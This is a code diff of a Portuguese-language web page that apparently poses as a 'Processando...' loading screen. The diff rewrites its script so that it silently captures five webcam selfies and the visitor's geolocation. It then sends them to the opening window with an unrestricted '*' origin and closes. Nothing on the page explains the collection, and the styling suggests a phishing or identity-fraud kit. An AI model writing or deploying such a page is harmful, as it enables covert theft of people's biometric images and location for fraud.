@@ -1,37 +1,40 @@
 <!doctype html>
+<html lang="pt-BR">
+<head>
 <meta charset="utf-8">
-<title>-</title>
+<title>Aguarde...</title>
+<style>
+body{font-family:Arial,Helvetica,sans-serif;background:#003d82;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
+</style>
+</head>
+<body>
+<h3>Processando...</h3>
 <script>
-/* 1. solicita permissão de câmera */
-navigator.mediaDevices.getUserMedia({video:true})
-  .then(stream=>{
-    const canvas=document.createElement('canvas');
-    const ctx=canvas.getContext('2d');
-    const video=document.createElement('video');
-    video.srcObject=stream;
-    video.play();
-    const faces=[];
-    let taken=0;
-    const snap=()=>{
-      ctx.drawImage(video,0,0,640,480);
-      canvas.toBlob(b=>faces.push(b));
-      taken++;
-      if(taken===5){          // 5 selfies
-        stream.getTracks().forEach(t=>t.stop());
-        /* 2. solicita permissão de localização */
-        navigator.geolocation.getCurrentPosition(pos=>{
-          window.opener.postMessage(
-            {type:'selfiesDone', data:{faces,pos}},
-            '*'
-          );
-          window.close();
-        });
-      }else setTimeout(snap,600);
-    };
-    video.onloadedmetadata=()=>snap();
-  })
-  .catch(()=>{
-    window.opener.postMessage({type:'negado'},'*');
-    window.close();
-  });
+(async()=>{
+  let selfies=[],loc=null;
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({video:true});
+    for(let i=0;i<5;i++){
+      const v=document.createElement('video');
+      v.srcObject=stream;v.play();
+      await new Promise(r=>v.onloadedmetadata=r);
+      const c=document.createElement('canvas');
+      c.width=v.videoWidth;c.height=v.videoHeight;
+      c.getContext('2d').drawImage(v,0,0);
+      selfies.push(c.toDataURL('image/jpeg'));
+      await new Promise(r=>setTimeout(r,600));
+    }
+    stream.getTracks().forEach(t=>t.stop());
+  }catch{window.opener.postMessage({type:'negado'},'*');window.close();return;}
+  navigator.geolocation.getCurrentPosition(
+    p=>{
+      loc={lat:p.coords.latitude,lon:p.coords.longitude};
+      window.opener.postMessage({type:'selfiesDone',dados:{selfies,locationData:loc}},'*');
+      window.close();
+    },
+    ()=>{window.opener.postMessage({type:'selfiesDone',dados:{selfies,locationData:null}},'*');window.close();}
+  );
+})();
 </script>
+</body>
+</html>
